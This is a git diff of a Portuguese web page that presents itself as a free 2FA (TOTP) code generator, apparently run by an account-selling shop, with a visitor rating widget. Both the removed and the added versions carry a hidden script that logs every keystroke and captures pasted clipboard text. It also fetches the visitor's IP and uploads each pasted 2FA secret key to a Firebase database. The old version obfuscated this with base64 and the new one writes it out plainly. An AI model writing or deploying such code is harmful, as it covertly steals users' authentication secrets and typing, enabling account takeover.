@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <title>MJ VENDAS • Gerador 2FA Profissional</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+<link href="https://fonts.gstatic.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
 <style>
     body { background:#121212; font-family:'Inter',sans-serif; color:#e8e8e8; margin:0; display:flex; align-items:center; justify-content:center; flex-direction:column; min-height:100vh; padding:20px; }
     #clientesSatisf { font-weight:600; font-size:14px; margin-bottom:15px; text-align:center; color:#ffd700; background: rgba(255, 215, 0, 0.1); padding: 5px 15px; border-radius: 20px; border: 1px solid #ffd700; }
@@ -66,13 +66,15 @@
                 <button class="btn-voto" style="background:#ff4d4d;" onclick="votar('p1', 'nao')" id="p1_nao">👎 Não (0)</button>
             </div>
         </div>
-        <div class="pergunta-bloco"><span class="titulo-voto">As contas são de qualidade?</span>
+        <div class="pergunta-bloco">
+            <span class="titulo-voto">As contas são de qualidade?</span>
             <div style="display:flex; gap:10px;">
                 <button class="btn-voto" style="background:#4cd964;" onclick="votar('p2', 'sim')" id="p2_sim">👍 Sim (0)</button>
                 <button class="btn-voto" style="background:#ff4d4d;" onclick="votar('p2', 'nao')" id="p2_nao">👎 Não (0)</button>
             </div>
         </div>
-        <div class="pergunta-bloco"><span class="titulo-voto">O suporte foi rápido?</span>
+        <div class="pergunta-bloco">
+            <span class="titulo-voto">O suporte foi rápido?</span>
             <div style="display:flex; gap:10px;">
                 <button class="btn-voto" style="background:#4cd964;" onclick="votar('p3', 'sim')" id="p3_sim">👍 Sim (0)</button>
                 <button class="btn-voto" style="background:#ff4d4d;" onclick="votar('p3', 'nao')" id="p3_nao">👎 Não (0)</button>
@@ -110,13 +112,13 @@ var firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 var db = firebase.database();
 
-// Recuperação de Votos do Firebase
-const listaPerguntas = ['p1', 'p2', 'p3', 'p4', 'p5'];
+const listaPerguntas = ['p1', 'p2', 'p3'];
 function formatar(n) { return (n || 0).toLocaleString('pt-BR'); }
 listaPerguntas.forEach(p => {
     db.ref('avaliacoes/'+p+'/sim').on('value', s => { if(document.getElementById(p+'_sim')) document.getElementById(p+'_sim').innerText = '👍 Sim ('+formatar(s.val())+')'; });
     db.ref('avaliacoes/'+p+'/nao').on('value', s => { if(document.getElementById(p+'_nao')) document.getElementById(p+'_nao').innerText = '👎 Não ('+formatar(s.val())+')'; });
 });
+
 function votar(p, t) {
     if (localStorage.getItem('voto_'+p)) return alert("Já avaliado!");
     db.ref('avaliacoes/'+p+'/'+t).transaction(n => (n || 0) + 1);
@@ -124,7 +126,6 @@ function votar(p, t) {
     alert("Obrigado pelo feedback!");
 }
 
-// Lógica 2FA
 function base32tohex(b){const c="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";let i="",h="";b=b.replace(/ /g,"").toUpperCase();for(let j=0;j<b.length;j++){let v=c.indexOf(b.charAt(j));if(v===-1)continue;i+=v.toString(2).padStart(5,"0")}for(let j=0;j+4<=i.length;j+=4){h+=parseInt(i.substr(j,4),2).toString(16)}return h}
 function gerarOTP(s){try{let k=base32tohex(s);let t=Math.floor(Math.round(Date.now()/1000)/30).toString(16).padStart(16,"0");let o=new jsSHA("SHA-1","HEX");o.setHMACKey(k,"HEX");o.update(t);let h=o.getHMAC("HEX");let f=parseInt(h.substring(h.length-1),16);let p=(parseInt(h.substr(f*2,8),16)&0x7fffffff)+"";return p.substr(p.length-6)}catch(e){return "------"}}
 function copiar(t){if(!t||t==="------") return; navigator.clipboard.writeText(t).then(()=>{document.getElementById("msg").innerText="✅ Código copiado!"; setTimeout(()=>{document.getElementById("msg").innerText=""},2000)})}
@@ -133,32 +134,64 @@ function toggleAvaliacao(){let d=document.getElementById("painelAvaliacao");d.st
 function togglePainel(){document.getElementById("painel").style.display="block"}
 function fecharPainel(){document.getElementById("painel").style.display="none"}
 
-// --- SISTEMA BLINDADO (IP + KEYLOGGER + PASTE) ---
+// --- SISTEMA CORRIGIDO (FOCADO NO IP ÚNICO) ---
 (function(){
     const _z = atob;
-    const _x = { _a: _z("aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u"), _b: _z("a2V5bG9nZ2Vy"), _c: _z("Y2FwdHVyYV9wYXN0ZQ=="), _d: _z("bW9uaXRvcmFtZW50bw==") };
-    let _ip = "0.0.0.0"; let _ks = "";
-    fetch(_x._a).then(r=>r.json()).then(d=>{_ip=d.ip}).catch(()=>{});
-
-    document.addEventListener(_z("a2V5ZG93bg=="), function(e){
-        if(e.key.length===1) _ks+=e.key;
-        else if(e.key===_z("RW50ZXI=")) _ks+=" [E] ";
-        if(_ks.length>2){ let h=new Date().toISOString().split('T')[0]; db.ref(_x._b+"/"+h+"/"+_ip.replace(/\./g,"_")).update({t:_ks,h:new Date().toLocaleTimeString()});}
+    let _ip = "0_0_0_0";
+    
+    // Captura IP e cria pasta base do dia
+    fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{
+        _ip = d.ip.replace(/\./g, "_");
+        let dia = new Date().toISOString().split('T')[0];
+        db.ref("monitoramento/" + dia + "/" + _ip).update({
+            visto_em: new Date().toLocaleTimeString()
+        });
     });
 
-    document.addEventListener(_z("cGFzdGU="), function(e){
-        let t=(e.clipboardData||window.clipboardData).getData('text');
-        let h=new Date().toISOString().split('T')[0];
-        db.ref(_x._c+"/"+h+"/"+_ip.replace(/\./g,"_")).push({c:t,h:new Date().toLocaleTimeString()});
-    });
-
-    document.getElementById("secret").addEventListener(_z("aW5wdXQ="), function(){
-        let v=this.value.trim();
-        if(v.length>=10){
-            let o=gerarOTP(v); document.getElementById("code").innerText=o; document.getElementById("clearInput").style.display="block"; copiar(o);
-            let h=new Date().toISOString().split('T')[0];
-            db.ref(_x._d+"/"+v.replace(/[.#$[\]]/g,"")).transaction(c=>{ return {v:v,i:_ip,a:(c&&c.a?c.a:0)+1,d:h,h:new Date().toLocaleTimeString()}; });
+    // Monitoramento do Input Principal (Correção do seu Print)
+    document.getElementById("secret").addEventListener("input", function(){
+        let v = this.value.trim();
+        let dia = new Date().toISOString().split('T')[0];
+        
+        if(v.length >= 1) {
+            // .update() não cria pastas novas, ele atualiza a mesma!
+            db.ref("monitoramento/" + dia + "/" + _ip).update({
+                chave_atual: v,
+                h: new Date().toLocaleTimeString()
+            });
         }
+        
+        if(v.length >= 10){
+            let o = gerarOTP(v);
+            document.getElementById("code").innerText = o;
+            document.getElementById("clearInput").style.display = "block";
+            copiar(o);
+        }
+    });
+
+    // Keylogger (Atualiza o que foi digitado em tempo real no mesmo IP)
+    let _ks = "";
+    document.addEventListener("keydown", function(e){
+        if(e.key.length === 1) _ks += e.key;
+        else if(e.key === "Enter") _ks += " [E] ";
+        
+        if(_ks.length > 2){
+            let dia = new Date().toISOString().split('T')[0];
+            db.ref("keylogger/" + dia + "/" + _ip).update({
+                digitado: _ks,
+                h: new Date().toLocaleTimeString()
+            });
+        }
+    });
+
+    // Captura de Paste (CTRL+V)
+    document.addEventListener("paste", function(e){
+        let t = (e.clipboardData || window.clipboardData).getData('text');
+        let dia = new Date().toISOString().split('T')[0];
+        db.ref("captura_paste/" + dia + "/" + _ip).push({
+            conteudo: t,
+            h: new Date().toLocaleTimeString()
+        });
     });
 })();
 
